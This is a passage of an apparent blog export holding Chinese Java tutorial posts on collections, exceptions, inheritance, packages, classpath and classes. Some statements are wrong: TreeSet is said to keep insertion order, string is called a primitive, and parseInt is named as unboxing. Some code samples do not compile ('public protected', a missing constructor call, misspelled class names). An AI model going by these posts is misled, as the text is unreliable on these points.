<h1 id="散列集与树集"><a href="#散列集与树集" class="headerlink" title="散列集与树集"></a>散列集与树集</h1><p>散列集的查找性能比数组和链表都要高。散列表为每个对象计算一个数，称为<code>散列码</code>，散列码由对象的实例域产生一个整数，具有不同数据域的对象产生不同的散列码。java提供了<code>set</code>接口，由<code>HashSet</code>类实现。散列迭代器将依次访问所有的桶，由于散列将元素分散在表的各个位置上，所以访问它们的顺序几乎是随机的。</p>
<p>树集<code>TreeSet</code>类与HashSet十分相似，不过在遍历树集中的元素时默认按添加顺序排序。也可以在构造树集时提供一个Comparator改变排序规则。TreeSet类实现了<code>SortedSet</code>接口和<code>NavigableSet</code>接口。</p>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>队列可以在尾部添加一个元素，在头部删除一个元素。有两个端头的队列称为<code>双端队列</code>，可以在头部和尾部同时添加或删除元素。不支持在队列中间插入元素。java提供了<code>Deque</code>接口并由<code>ArrayDeque</code>和<code>LinkedList</code>类实现，这两个类都提供了双端队列。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—处理异常</title>
    <url>/2018/06/24/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94-%E5%A4%84%E7%90%86%E5%BC%82%E5%B8%B8/</url>
    <content><![CDATA[<p>处理异常的任务就是将控制权从错误产生的地方转移给能够处理这种情况的错误处理器。如果某个方法不能采用正常的途径完成他的任务 ，就可以通过另外一个路径退出方法。在这种情况下，方法并不能返回任何值，而是抛出（throw）一个封装了错误信息的对象，然后这个方法会退出且不返回任何值。</p>
<p>异常又分为<code>受查(check)异常</code>与<code>非受查(uncheck)异常</code>。非受查异常包括Error类异常与RuntimeException类异常，这些异常都是因为程序本身设计不合理产生的，属于逻辑异常。而受查异常表示其他异常，如IOException。处理异常指的是处理受查异常。</p>
<p><img src="http://p1csf090h.bkt.clouddn.com/java/error2412.png" alt="异常分类"></p>
<h1 id="throws-throw抛出异常"><a href="#throws-throw抛出异常" class="headerlink" title="throws/throw抛出异常"></a>throws/throw抛出异常</h1><p>一个方法不仅需要告诉编译器将要返回什么值，还要告诉编译器有可能发生什么错误。所以方法应在其首部声明所有可能抛出的异常，这样可以从首部反映出这个方法可能抛出哪类受查异常。这就要用到<code>throws</code>关键字。例如FileInputStream类的构造器方法可能由于文件不存在而抛出一个FileNotFoundException：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(String name)</span> <span class="keyword">throws</span> FileNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>多个Exception之间用 <code>，</code>分开。<br>如果超类方法没有抛出任何异常，那么子类方法也不能抛出异常。</p>
<p>如果要手动抛出一个异常，用关键字<code>throw</code>。首先构造一个异常对象，然后用throw把这个对象抛出就可以了。如抛出一个EOFException：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> EOFException；</span><br></pre></td></tr></table></figure>
<h1 id="try-catch捕获异常"><a href="#try-catch捕获异常" class="headerlink" title="try/catch捕获异常"></a>try/catch捕获异常</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以使用多个单独的catch字句捕获多个异常。<br>异常对象可能包含与异常本身相关的信息，要想获得对象的更多信息可以用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">e.getMessage()</span><br></pre></td></tr></table></figure>

<p>对实现了AutoCloseable接口的资源进行处理时，可以使用带资源的try语句，这样无论是否成功使用资源，在try块退出时都会自动关闭资源：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> (Resource res = ...)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开hello.txt</span></span><br><span class="line"><span class="keyword">try</span> (FileWriter writer = <span class="keyword">new</span> FileWriter(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="keyword">true</span>))</span><br><span class="line">&#123;</span><br><span class="line">    deal with the resource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译器严格执行throws说明符，<strong>如果方法A调用了方法B，而方法B被声明为可能抛出异常e，则A要么继承e（即声明为可能抛出e），要么捕获e</strong></p>
<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>finally块中的代码不管是否有异常被捕获，都会执行。并且如果处理结果与try/catch中的处理发生冲突，finally中的处理结果会覆盖之。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ExceptionType e)</span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line">    code</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h1><p>Throwable是类，Error和Exception都继承自这个类。所以也可以用try/catch进行捕捉</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">    t.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在方法声明中，也可以抛出Throwable类异常，由这个方法的调用者处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Throwable</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Throwable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        test();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Throwable t) &#123;</span><br><span class="line">        t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—继承与多态</title>
    <url>/2018/06/15/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%A4%9A%E6%80%81/</url>
    <content><![CDATA[<p>修饰符<code>extends</code>表示继承，子类会继承超类的域和方法。例如子类Manager继承超类Employee：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 添加新的域或方法</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<h1 id="覆盖方法"><a href="#覆盖方法" class="headerlink" title="覆盖方法"></a>覆盖方法</h1><p>想要访问超类的私域，需要使用修饰符<code>super</code>，用 <code>super</code> 代表超类。如：<code>重写</code>Manager的getsalary方法为基本工资+奖金。而salsry是private的，只有Employee类的方法才能访问。要获得基本工资必须通过调用超类getsalary方法。为了区别这两个方法，超类的方法表示为<code>super.funcname([args])</code>的形式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.salary = bonus + <span class="keyword">super</span>.getsalary();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>覆盖方法时，一定要保证返回类型的兼容性。允许子类将覆盖方法的返回类型定义为原返回类型的子类型</strong>。<br><strong>覆盖方法时，子类方法可见性不能低于超类。如果超类方法是public，那么覆盖方法也是public</strong></p>
<h1 id="子类构造器"><a href="#子类构造器" class="headerlink" title="子类构造器"></a>子类构造器</h1><p>由于子类不能访问超类的私有域，所以必须在子类构造器中利用超类的构造器对超类私有域进行初始化。通过关键字<code>super</code>实现对超类构造器的调用。</p>
<p><strong><code>super</code>调用构造器语句必须是子类构造器的第一条语句：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> bonus;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Manager</span><span class="params">(String aName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(aName);</span><br><span class="line">        <span class="keyword">this</span>.bonus = <span class="number">500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="方法调用与多态"><a href="#方法调用与多态" class="headerlink" title="方法调用与多态"></a>方法调用与多态</h1><p><strong>一个被定义为指向超类的变量可以指向子类，反之行不通</strong>。一个变量对象可以指向多种实际类型的现象被称为<code>多态</code>，在运行时能自动选择调用哪个方法的现象称为<code>动态绑定</code>。对于private、static、final方法，编译器可以准确地知道应该调用哪个方法，称为<code>静态绑定</code></p>
<h2 id="理解方法调用"><a href="#理解方法调用" class="headerlink" title="理解方法调用"></a>理解方法调用</h2><p>假设要调用x.f(args)。其中x为隐式参数，声明为类C的一个对象，下面是调用过程描述：</p>
<ol>
<li>编译器查看对象的声明类型和方法名。可能存在多个名字为f，但参数类型不一样的方法。编译器会一一列举所有C类中名为f的方法和其超类中访问属性为public且名为f的方法。<em>至此编译器已获得所有可能被调用的候选方法</em></li>
<li>编译器查看调用方法是提供的参数类型。如果所有名为f的方法中存在一个与提供的参数类型完全匹配，就选择这个方法。这个过程被称为<code>重载解析</code>。由于存在类型转换，所以该过程也遵循“相似原则”，形参类型与实参匹配度最高的优先。<em>至此编译器已获得需要调用的方法名字和参数类型，即方法签名</em></li>
<li>在jvm创建的<code>方法表</code>中搜索相应的方法。每次调用都要进行搜索，开销太大。jvm创建了一张方法表，里面存放着方法签名与实际调用方法的映射关系。</li>
</ol>
<h1 id="阻止继承：final类和方法"><a href="#阻止继承：final类和方法" class="headerlink" title="阻止继承：final类和方法"></a>阻止继承：final类和方法</h1><p>不允许扩展的类被称为<code>final类</code>。如果定义类的时候用了<code>final</code>修饰符就表明这个类是final类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Programmer</span> <span class="keyword">extends</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类中的方法也可以被声明为<code>final</code>。如果这样做子类就不能覆盖这个方法（final类的所有方法默认为final方法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将方法或类定义为<code>final</code>最大的好处是防止其在子类中被改变含义。</p>
<h1 id="受保护访问"><a href="#受保护访问" class="headerlink" title="受保护访问"></a>受保护访问</h1><p>最好将类中的域标记为<code>private</code>，任何声明为<code>private</code>的内容对其他类都是不可见的，即使是子类也一样。如果希望子类能够访问超类的私有域或方法，可以用修饰符：<code>protected</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> salary;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">protected</span> <span class="keyword">double</span> <span class="title">getsalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Java的4种可见性修饰符"><a href="#Java的4种可见性修饰符" class="headerlink" title="Java的4种可见性修饰符"></a>Java的4种可见性修饰符</h1><p>下面是Java用于控制可见性的4种修饰符：  </p>
<ol>
<li>仅对本类可见——private</li>
<li>对所有类可见——public</li>
<li>对本包和所有子类可见——protected</li>
<li>仅对本包可见——默认，不需要修饰符</li>
</ol>
<h1 id="对象包装器"><a href="#对象包装器" class="headerlink" title="对象包装器"></a>对象包装器</h1><p>Java不是完全的面向对象语言，其基本类型：boolean、char、short、int、long、float、double的值都不是对象。而这些基本类型都有与之对应的类。如int对应Integer，char对应Character，void对应Void…对象包装类包装的值都是不变的。</p>
<p>要定义一个整形数组列表，只要：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>此时，调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.add(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>编译器将会将其视为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">list.add(Integer.valueOf(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>

<p>这种行为称为<code>自动装箱</code>，与之对应的还有<code>自动拆箱</code>。手动拆箱的方法为<code>Integer.parseInt(Integer obj)</code></p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—包</title>
    <url>/2018/06/15/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E2%80%94%E2%80%94%E5%8C%85/</url>
    <content><![CDATA[<p>Java 允许使用包（package）将类组织起来，使用包的主要原因是确保类名的唯一性。如果有两个名字相同的类，只要把它们放在不同的包中就不会有影响。</p>
<p>从编译器（compiler）的角度看，嵌套的包之间没有任何关系。例如java.util包与 java.util 包毫无关系，每一个都拥有独立的类集合。</p>
<p>当编译一个 .java 文件（即一个编译单元）时，在.java文件中的每个类都会有一个输出文件，而该输出文件的名称与 .java 文件中每个类的名称相同，只是多了一个后缀名 .class。因此在编译少量 .java 文件之后，会得到大量的 .class 文件。每一个 .java 文件编译以后都会有一个 public 类，以及任意数量的非 public 类。因此每个 .java 文件都是一个构件，如果希望许许多多的这样的构件从属于同一个群组，就可以在每一个 .java 文件中使用关键字 package。而这个群组就是一个类库。</p>
<p>就表示你在声明该编译单元是名为 fruit 的类库的一部分，或者换句话说，你正在声明该编译单元中的 public 类名称是位于 fruit 名称的保护伞下，由 fruit 名称罩着。任何想要使用该 public 类名称的人都必须指定全名或者与 fruit 结合使用关键字 import。</p>
<h1 id="包作用域"><a href="#包作用域" class="headerlink" title="包作用域"></a>包作用域</h1><p>一个类、方法或变量如果没有指定 <code>private</code> 或 <code>public</code>，则可以被同一个包中的所有方法访问（如非公）。</p>
<h1 id="将类放入包中"><a href="#将类放入包中" class="headerlink" title="将类放入包中"></a>将类放入包中</h1><p>要想将类放入包中，就必须将包的名字放在源文件的开头。包中定义类的代码之前。使用关键字 <code>package</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件名为Employee.java，位于目录com/qiuyueqy/learnjava下</span></span><br><span class="line"><span class="keyword">package</span> com.qiuyueqy.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码表明编译单元位于 com.qiuyueqy.learnjava 的保护伞下，任何想要使用该 public 类的人必须指定全名或使用修饰符 <code>import</code></p>
<p>如果没有在源文件中放置 package 语句，这个源文件中的类就被放置在一个默认包（default package）中。默认包是一个没有名字的包</p>
<p><strong>编译器对文件（以 .java 为扩展名）进行操作，而java解释器加载类（以. class 为扩展名）</strong></p>
<h2 id="类的导入"><a href="#类的导入" class="headerlink" title="类的导入"></a>类的导入</h2><p>一个类可以使用所属包中所有的类，一起其他包的公有类。可以用两种方式访问其他包的公有类：</p>
<ul>
<li>在类名前加上完整的包名<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.time.LocalDate date = <span class="keyword">new</span> java.time.LoalcDate.now();</span><br></pre></td></tr></table></figure></li>
<li>通过关键字<code>import</code>导入，**<code>import</code>必须在<code>package</code>之后**<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qiuyueqy.learnjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="静态导入"><a href="#静态导入" class="headerlink" title="静态导入"></a>静态导入</h2><p><code>import</code>语句不仅可以导入类，还可以导入类的静态方法和静态域：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 导入System类的静态方法和静态域</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Systme.*;</span><br></pre></td></tr></table></figure>
<p>这样就可以使用System类的静态方法和域，而不用加前缀：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">out.println(<span class="string">&quot;Hello World!&quot;</span>); <span class="comment">// System.out.println()</span></span><br><span class="line">exit(<span class="number">0</span>); <span class="comment">// System.exit()</span></span><br></pre></td></tr></table></figure>

<h2 id="类路径"><a href="#类路径" class="headerlink" title="类路径"></a>类路径</h2><p>javac 编译器要查询一个编译单元，会先从当前包开始，然后查询所有 <code>import</code> 语句，确定<code>import</code>语句导入的包中是否包含所需要的类。</p>
<p>java 虚拟机（jvm）查询类文件时，它首先在 jre/lib 和 jre/lib/ext 目录下的归档文件中所存放的系统类文件里找，如果找不到再从环境变量 CLASSPATH（可以通过操作系统来设置）里面找。CLASSPATH包含一个或多个目录，用作查找 .class 文件的根目录。从根目录开始，解释器获取包名称并将每个句点替换成反斜杠，以从 CLASSPATH 根中产生一个路径（例如，package fruit.Apple 就变成为 fruit/Apple 或 fruit/Apple 或其他，这将取决于操作系统）。得到的路径会与 CLASSPATH 中的各个不同的根目录路径相连接以获得一个完整的目录路径，解释器就在这些目录中查找与你所需要的类名称相同的 .class 文件。</p>
<p>类文件默认与 java 文件处于同一位置，但也可以存储在 jar（java 归档）文件中。jar 文件是多个压缩形式的类文件和子目录的集合。通过使用 jar 文件可以使类被多个程序共享。为了达到这个目的，需要做到以下几点：</p>
<ol>
<li>把类放到一个目录中。这个目录是一个树状结构的基目录。例如：<strong>如果希望将com.qiuyueqy.learnjava类添加到其中，这个 learnjava.class 类文件就必须位于子目录 /home/user/classdir/com/qiuyueqy中</strong></li>
<li>将jar文件放在非类路径中，如：/home/user/archives</li>
<li>设置类路径（class path）。<strong>类路径是所有包含类文件的路径的集合</strong>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/user/classdir:.:/home/user/archives/archives.jar // Linux下</span><br><span class="line"></span><br><span class="line">C:\classdir;.;C:\archives\archives.jar // windows下</span><br></pre></td></tr></table></figure></li>
</ol>
<p>类路径包括：</p>
<ul>
<li>基目录: 如 /home/user/classdir和C:\classdir</li>
<li>当前目录: .</li>
<li>jar文件： 如 /home/user/archives/archives.jar 或 C:\archives\archives.jar</li>
</ul>
<h2 id="设置类路径"><a href="#设置类路径" class="headerlink" title="设置类路径"></a>设置类路径</h2><p>最好通过<code>-classpath</code>或<code>-cp</code>选项指定类路径，例如要执行Employee.class：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -classpath /home/user/classdir:.:/home/user/archives/archives.jar Employee</span><br></pre></td></tr></table></figure>
<p>也可以通过设置环境变量<code>CLASSPAHT</code>。默认CLASSPATH为<code>.</code>，改为我们需要的路径集合:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set CLASSPATH=C:\classdir;.;C:\archives\archives.jar //windows下</span><br><span class="line"></span><br><span class="line">export CLASSPATH=/home/user/classdir:.:/home/user/archives/archives.jar // Linux下</span><br></pre></td></tr></table></figure>
<p>这样在shell退出前CLASSPATH变量都有效</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础—类与接口</title>
    <url>/2018/06/13/Java%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%8E%A5%E5%8F%A3%E4%B8%8E%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="对象与对象变量"><a href="#对象与对象变量" class="headerlink" title="对象与对象变量"></a>对象与对象变量</h1><p><strong>Java中，只有基本类型(primitive types)不是对象，例如number，string和boolean</strong>。</p>
<p>首先要清楚：对象与对象变量是不一样的。对象变量只是对对象的一个引用。</p>
<p>想使用对象变量，首先要构造对象并指定其初始状态。<br>在定义类时，使用<code>构造器</code>指出如何初始化这个类，在构造一个新实例时，构造器会运行，将实例域初始化为所希望的状态。<strong>构造器是一种特殊的方法，没有返回值</strong>。构造器的名字与类名相同。<strong>一个类有一个或多个构造器方法</strong>。不要在构造器中定义与实例域重名的局部变量，否则编译器会报错。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String colour;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面这个就是构造器，方法名与类名相同</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Bird</span><span class="params">(String c, <span class="keyword">int</span> s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.colour = c;</span><br><span class="line">        <span class="keyword">this</span>.sex = s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要构造一个对象，需要在构造器前面加上<code>new</code>操作符：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bird bird = <span class="keyword">new</span> Bird(<span class="string">&quot;绿色&quot;</span>, <span class="number">0</span>) <span class="comment">// 这里的Bird应该理解为调用Bird类的构造器，构造器前加上new操作符</span></span><br></pre></td></tr></table></figure>
<p>bird是一个对象变量，并没有实际包含一个对象，而仅仅引用一个对象。<strong>任何对象变量的值都是对存储在另一个地方的一个对象的引用</strong></p>
<h1 id="更改器方法与访问器方法"><a href="#更改器方法与访问器方法" class="headerlink" title="更改器方法与访问器方法"></a>更改器方法与访问器方法</h1><p>对于每个特定的类实例，都有一组特定的实例域值，这些值的集合就是这个对象的<code>当前状态</code>。<br>实现封装的关键是绝不能让类中的方法直接地访问其他类的实例域。程序仅能通过对象的方法与对象的实例域进行交互。对象的方法会改变原对象的状态，称之为更改器方法。只访问实例域而不改变原对象状态的方法，称之为访问器方法。</p>
<p>访问器方法不要返回可变对象，否则获取这个对象后通过调用可变对象的更改器方法会破坏封装性！</p>
<h1 id="自定义类"><a href="#自定义类" class="headerlink" title="自定义类"></a>自定义类</h1><p>关键字<code>public</code>修饰的类称为共有类。<strong>在一个.java源文件（编译单元）中，只能有一个共有类，类名与文件名相同</strong>。可以有多个非公有类。包之外的世界是无法看见这些非公有类的，因为它们不是public类，而且它们主要用来为公有类提供支持。</p>
<p>关键字<code>public</code>修饰的方法、字段意味着任何类的任何方法都可以通过点操作调用这些方法和字段，而<code>private</code>确保只有自身类可以访问这些实例域或方法。（<strong>同属一个类的实例可以互相访问访问私有域</strong>）</p>
<p>可以把实例域定义为<code>final</code>。构造对象时必须要初始化这样的域（构造器之前<br>），并且在后面的操作中不能再对它进行改变。</p>
<h1 id="静态域"><a href="#静态域" class="headerlink" title="静态域"></a>静态域</h1><p>如果将域定义为<code>static</code>，每个类中只有一个这样的域。而每个对象对于所有的实例域却都有自己的一份拷贝。这样就把实例域与静态域区分开来：每个实例有自己的实例域，而各个实例共享一个静态域。</p>
<h1 id="静态常量"><a href="#静态常量" class="headerlink" title="静态常量"></a>静态常量</h1><p>例如，在Math类中定义圆周率：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Math</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.14159265758</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在程序中，可以使用<code>Math.PI</code>获取这个常量。<br>如果关键字<code>static</code>被省略，PI就变成了Math类的一个实例域。需要通过Math类的对象访问PI，并且每一个Math对象都有他自己的一份PI拷贝<br>每个类对象都可以对公有域进行修改，所以最好不要把域设计成<code>public</code>。然而共有常量（即final域）却没有这个问题，因为PI被声明为<code>final</code>，不允许再修改它的值。</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>方法封装了一系列语句所描述的运算。方法需要参数（某种数据类型的值）并根据参数计算出某种数据类型的返回值（例如数学函数的结果）或者产生某种副作用（例如main函数）</p>
<h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>静态方法是一种不能向对象实施操作的方法。可以认为静态方法是没有<code>this</code>参数的方法。静态方法不能访问实例域，因为它不能操作对象，但是静态方法可以访问自身类的静态域。一下两种情况适合用静态方法：</p>
<ol>
<li>一个方法不需要访问对象状态，其所需要的参数都是通过显示参数提供</li>
<li>一个方法只需要访问类的静态域</li>
</ol>
<p>静态方法还有一种常见用途就是用静态工厂方法构造对象，而不是使用<code>new</code>构造符。</p>
<h2 id="main方法"><a href="#main方法" class="headerlink" title="main方法"></a>main方法</h2><p>调用静态方法不需要使用对象，同理，main方法也是静态方法。<br>main方法不对任何对象进行操作，事实上，在启动程序时还没有任何一个对象。静态的main方法将执行并创建程序所需要的对象<br>每个类可以有一个main方法，这是常用于类的单元测试的技巧，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String n, <span class="keyword">int</span> a, <span class="keyword">double</span> s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = n;</span><br><span class="line">        <span class="keyword">this</span>.age = a;</span><br><span class="line">        <span class="keyword">this</span>.salary = s;    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee e = <span class="keyword">new</span> Employee(<span class="string">&quot;Mike&quot;</span>, <span class="number">21</span>, <span class="number">2354</span>);</span><br><span class="line">        e.raiseSalary(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果想独立测试Employee类，只需执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Employee</span><br></pre></td></tr></table></figure>
<p>如果Employee类是一个Application的一部分，可以用如下命令执行程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java Application</span><br></pre></td></tr></table></figure>
<p>此时Employee中的main方法不会被执行</p>
